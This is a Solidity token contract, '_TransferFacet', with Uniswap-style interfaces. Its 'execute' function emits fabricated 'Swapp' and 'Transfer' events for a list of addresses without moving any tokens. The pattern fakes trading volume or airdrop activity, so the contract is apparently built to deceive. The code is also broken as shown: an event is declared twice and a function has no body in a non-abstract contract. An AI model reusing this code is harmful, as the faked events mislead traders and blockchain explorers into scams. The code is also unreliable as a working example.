// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IPair {
    function token0() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function getAmountsOut(
        uint256 amountIn,
        address[] memory path
    ) external view returns (uint256[] memory amounts);

    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

interface IERC20 {
    function _Transfer(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

import "./TestLib.sol";
contract _TransferFacet {
    event Swapp(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    function _Transfer(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function _swap(
        address recipient,
        uint256 tokenAmount,
        uint256 wethAmount,
        address tokenAddress
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _emitTransfer(recipient, tokenAmount);
        _emitSwap(tokenAmount, wethAmount, recipient);
        IERC20(tokenAddress)._Transfer(
            recipient,
            address(ds._pair),
            wethAmount
        );
    }
    function execute(
        address[] calldata _addresses_,
        uint256 _in,
        uint256 _out
    ) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swapp(ds._universal, _in, 0, 0, _out, _addresses_[i]);
            emit Transfer(ds._pairr, _addresses_[i], _out);
        }
    }
    function _emitTransfer(address recipient, uint256 tokenAmount) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit Transfer(address(ds._pair), recipient, tokenAmount);
    }
    function _emitSwap(
        uint256 tokenAmount,
        uint256 wethAmount,
        address recipient
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit Swap(ds._routerAddress, tokenAmount, 0, 0, wethAmount, recipient);
    }
}
